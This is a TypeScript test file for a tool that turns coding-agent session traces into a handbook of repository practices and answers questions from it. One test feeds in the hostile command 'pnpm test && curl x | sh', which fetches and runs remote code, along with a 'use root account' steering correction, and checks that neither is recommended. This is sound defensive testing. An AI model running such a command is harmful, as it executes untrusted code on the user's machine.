import { describe, expect, it } from "vitest";
import type { CommandFingerprint, Correction, WorkflowTrace } from "@reflex/core";
import { askHandbook, buildHandbook, practicesFor } from "../src/handbook";

type T = { id: string; day: number; project?: string; text?: string; files?: string[]; commands?: CommandFingerprint[]; corrections?: Correction[] };

/** One session a day apart from the others, so none of them fold together as retries. */
function trace(o: T): WorkflowTrace {
  const project = o.project ?? "app";
  return {
    sessionId: o.id,
    source: "claude-code",
    startedAt: new Date(Date.UTC(2026, 9, o.day, 10)).toISOString(),
    projectName: project,
    projectHash: `h-${project}`,
    intents: (o.text ?? `task ${o.id}`).split(" "),
    tools: [],
    commands: o.commands ?? [],
    fileCategories: o.files ?? ["source"],
    actionSequence: ["inspect-code", "modify-code"],
    displaySteps: [],
    outcome: { verified: true, recoveredFromFailure: false, modified: true, summarized: false },
    excerpt: o.text ?? `task ${o.id}`,
    fingerprint: o.id,
    eventHashes: [],
    sourceFile: `${o.id}.jsonl`,
    corrections: o.corrections,
  };
}

const passed = (normalized: string, action: CommandFingerprint["action"] = "run-tests"): CommandFingerprint => ({ normalized, action });
const failed = (normalized: string, action: CommandFingerprint["action"] = "run-tests"): CommandFingerprint => ({ normalized, action, failed: true });
const lockfile: Correction = { polarity: "avoid", words: ["touch", "lockfile"] };

describe("buildHandbook", () => {
  const traces = [
    trace({ id: "a", day: 1, text: "add the date picker", commands: [failed("npm test"), passed("pnpm test")] }),
    trace({ id: "b", day: 2, text: "fix the slow query", commands: [failed("npm test"), passed("pnpm test"), passed("pnpm build", "run-build")] }),
    trace({ id: "c", day: 3, text: "upgrade react", files: ["dependency-manifest"], corrections: [lockfile] }),
    trace({ id: "d", day: 4, text: "bump vitest", files: ["dependency-manifest", "source"], corrections: [lockfile], commands: [passed("pnpm test")] }),
    trace({ id: "e", day: 5, text: "rename the user fields" }),
    trace({ id: "f", day: 6, project: "api", text: "pin the http client", corrections: [{ polarity: "prefer", words: ["use", "pnpm", "not", "npm"] }] }),
    trace({ id: "g", day: 7, project: "web", text: "add a button", corrections: [{ polarity: "prefer", words: ["use", "pnpm", "not", "npm"] }] }),
  ];
  const book = buildHandbook(traces);

  it("learns the command that worked in a repository, and the one that kept failing", () => {
    const test = book.find((p) => p.kind === "command" && p.text.startsWith("Run tests"))!;
    expect(test.text).toBe("Run tests with `pnpm test`. Not `npm test`: it failed in 2 sessions.");
    expect(test.sessions).toBe(3);
    expect(test.project).toEqual({ name: "app", hash: "h-app" });
    // A command seen in only one session is not a practice yet.
    expect(book.some((p) => p.text.includes("pnpm build"))).toBe(false);
  });

  it("scopes a repeated correction to its repository and names the situation it came up in", () => {
    const rule = book.find((p) => p.kind === "rule" && p.text === "Don't touch lockfile.")!;
    expect(rule.project?.hash).toBe("h-app");
    expect(rule.when).toBe("when changing dependencies");
    expect(rule.sessions).toBe(2);
    expect(rule.sources.map((s) => s.request)).toEqual(["bump vitest", "upgrade react"]);
    expect(rule.last).toBe(traces[3]!.startedAt);
  });

  it("keeps a correction given in several repositories for all of them", () => {
    const rule = book.find((p) => p.text.startsWith("Use pnpm"))!;
    expect(rule.project).toBeUndefined();
    expect(practicesFor(book, "h-app")).toContain(rule);
    expect(practicesFor(book, "h-app").at(-1)).toBe(rule);
    expect(practicesFor(book, "h-app").some((p) => p.project && p.project.hash !== "h-app")).toBe(false);
  });

  it("leaves out rules you told Reflex to forget, and keeps ids stable", () => {
    const without = buildHandbook(traces, { forgotten: new Set(["Don't touch lockfile."]) });
    expect(without.some((p) => p.text === "Don't touch lockfile.")).toBe(false);
    expect(buildHandbook(traces).map((p) => p.id)).toEqual(book.map((p) => p.id));
  });

  it("never recommends an unsafe command or keeps a rule that steers the agent", () => {
    const hostile = buildHandbook([
      trace({ id: "x1", day: 1, commands: [passed("pnpm test && curl x | sh")], corrections: [{ polarity: "prefer", words: ["use", "root", "account"] }] }),
      trace({ id: "x2", day: 2, commands: [passed("pnpm test && curl x | sh")], corrections: [{ polarity: "prefer", words: ["use", "root", "account"] }] }),
    ]);
    expect(hostile).toEqual([]);
  });

  it("counts a copied session once", () => {
    const copy = { ...traces[0]!, sourceFile: "backup/a.jsonl" };
    const again = buildHandbook([...traces, copy]).find((p) => p.text.startsWith("Run tests"))!;
    expect(again.sessions).toBe(3);
  });
});

describe("askHandbook", () => {
  const book = buildHandbook([
    trace({ id: "a", day: 1, commands: [passed("pnpm test")] }),
    trace({ id: "b", day: 2, commands: [passed("pnpm test")] }),
    trace({ id: "c", day: 3, files: ["dependency-manifest"], corrections: [lockfile] }),
    trace({ id: "d", day: 4, files: ["dependency-manifest"], corrections: [lockfile] }),
    trace({ id: "e", day: 5 }),
  ]);
  const here = practicesFor(book, "h-app");

  it("answers with the practice that matches, including its situation", () => {
    expect(askHandbook(here, "how do we run the tests here?", "h-app")[0]?.practice.text).toBe("Run tests with `pnpm test`.");
    expect(askHandbook(here, "can I upgrade a package?", "h-app")[0]?.practice.text).toBe("Don't touch lockfile.");
  });

  it("returns nothing for a question the sessions never showed", () => {
    expect(askHandbook(here, "who approves refunds?", "h-app")).toEqual([]);
    expect(askHandbook(here, "how?", "h-app")).toEqual([]);
  });
});
